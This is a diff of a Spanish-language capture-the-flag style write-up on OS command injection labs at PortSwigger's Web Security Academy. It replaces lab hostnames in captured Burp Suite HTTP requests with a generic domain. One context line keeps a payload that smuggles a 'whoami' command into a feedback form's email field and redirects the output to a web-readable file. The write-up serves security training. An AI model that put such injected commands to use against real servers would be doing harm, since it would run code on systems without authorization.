@@ -36,16 +36,16 @@ Asi que con burpsuite interceptamos la peticion esto con el fin de buscar el par
 
 ```bash
 POST /product/stock HTTP/2
-Host: 0a61008804e3f212807eea4a0003005e.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=8PxVELlzvUaTHGM1vWI84G4tftiCbtjA
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
 Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
-Referer: https://0a61008804e3f212807eea4a0003005e.web-security-academy.net/product?productId=4
+Referer: https://web-security-academy.net/product?productId=4
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 21
-Origin: https://0a61008804e3f212807eea4a0003005e.web-security-academy.net
+Origin: https://web-security-academy.net
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -58,16 +58,16 @@ Ahora empezamos a testear el parametro con nuestros diferentes delimitadores par
 
 ```bash
 POST /product/stock HTTP/2
-Host: 0a61008804e3f212807eea4a0003005e.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=8PxVELlzvUaTHGM1vWI84G4tftiCbtjA
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
 Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
-Referer: https://0a61008804e3f212807eea4a0003005e.web-security-academy.net/product?productId=4
+Referer: https://web-security-academy.net/product?productId=4
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 28
-Origin: https://0a61008804e3f212807eea4a0003005e.web-security-academy.net
+Origin: https://web-security-academy.net
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -84,7 +84,7 @@ En este laboratorio se nos presenta un ejercicio similar pero con la diferencia 
 
 ```bash
 POST /feedback/submit HTTP/2
-Host: 0a75006803aef804807cdf3c006700fd.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=NgtHApkbHLXlQ5ClHHqbKOItGwTA96IO
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
@@ -92,8 +92,8 @@ Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 94
-Origin: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net
-Referer: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net/feedback
+Origin: https://web-security-academy.net
+Referer: https://web-security-academy.net/feedback
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -120,7 +120,7 @@ Algunos ejemplos de uso:
 
 ```bash
 POST /feedback/submit HTTP/2
-Host: 0a75006803aef804807cdf3c006700fd.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=NgtHApkbHLXlQ5ClHHqbKOItGwTA96IO
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
@@ -128,8 +128,8 @@ Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 121
-Origin: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net
-Referer: https://0a75006803aef804807cdf3c006700fd.web-security-academy.net/feedback
+Origin: https://web-security-academy.net
+Referer: https://web-security-academy.net/feedback
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -169,7 +169,7 @@ Interceptamos la peticion de la seccion feedback
 
 ```bash
 POST /feedback/submit HTTP/2
-Host: 0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=EqDsjzMH7uTKgqHa0cPwJCh2eoR99R7Y
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
@@ -177,8 +177,8 @@ Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 122
-Origin: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
-Referer: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net/feedback
+Origin: https://web-security-academy.net
+Referer: https://web-security-academy.net/feedback
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -199,7 +199,7 @@ email=jsahdcyusgfd%40gmail.com||whoami+>+/var/www/images/output.txt||
 
 ```bash
 POST /feedback/submit HTTP/2
-Host: 0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=EqDsjzMH7uTKgqHa0cPwJCh2eoR99R7Y
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
@@ -207,8 +207,8 @@ Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 122
-Origin: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
-Referer: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net/feedback
+Origin: https://web-security-academy.net
+Referer: https://web-security-academy.net/feedback
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -221,7 +221,7 @@ csrf=L9DKMCEobZCKjwOl8X12CBar8p3JzZmj&name=jfygysuc&email=jsahdcyusgfd%40gmail.c
 
 ```bash
 GET /image?filename=output.txt HTTP/2
-Host: 0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=EqDsjzMH7uTKgqHa0cPwJCh2eoR99R7Y
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
@@ -229,8 +229,8 @@ Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
-Origin: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
-Referer: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net/feedback
+Origin: https://web-security-academy.net
+Referer: https://web-security-academy.net/feedback
 ```
 <img src="imagenes/img3.png">
 
@@ -241,7 +241,7 @@ En este laboratorio cambia las reglas de comunicacion a qui ya es atraves de Dns
 
 ```bash
 POST /feedback/submit HTTP/2
-Host: 0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
+Host: web-security-academy.net
 Cookie: session=EqDsjzMH7uTKgqHa0cPwJCh2eoR99R7Y
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 Accept: */*
@@ -249,8 +249,8 @@ Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 122
-Origin: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net
-Referer: https://0ac2000b04db5e5484b755f0003e005a.web-security-academy.net/feedback
+Origin: https://web-security-academy.net
+Referer: https://web-security-academy.net/feedback
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
